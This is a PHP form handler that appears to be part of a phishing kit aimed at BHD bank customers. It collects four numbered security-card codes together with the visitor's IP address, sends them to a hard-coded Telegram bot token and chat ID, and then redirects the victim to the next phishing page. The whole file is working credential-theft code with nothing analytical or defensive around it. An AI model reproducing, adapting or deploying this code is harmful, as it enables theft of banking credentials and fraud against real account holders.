<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $co1 = $_POST["co1"];
	$co2 = $_POST["co2"];
	$co3 = $_POST["co3"];
	$co4 = $_POST["co4"];
	
  $botToken = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI"; // Reemplaza con tu token de bot
    $chatID = "8555745789"; // Reemplaza con tu chat ID

    // Obtén la IP del cliente
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

    // Construye el mensaje
    $message = "=====CODIGO 1 BHD=======\n 21: $co1\n 11: $co2\n 8: $co3\n 40: $co4\nIP del cliente: $ip";

    // Envia el mensaje a Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array("chat_id" => $chatID, "text" => $message);
    $options = array(
        "http" => array(
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
            "content" => http_build_query($data)
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result) {
        // Redirige a la página de éxito
        header("Location: pa03.php");
        exit; // Asegura que el script se detenga después de la redirección
    } else {
        // Redirige a la página de error
        header("Location: index");
        exit;
    }
}
?>
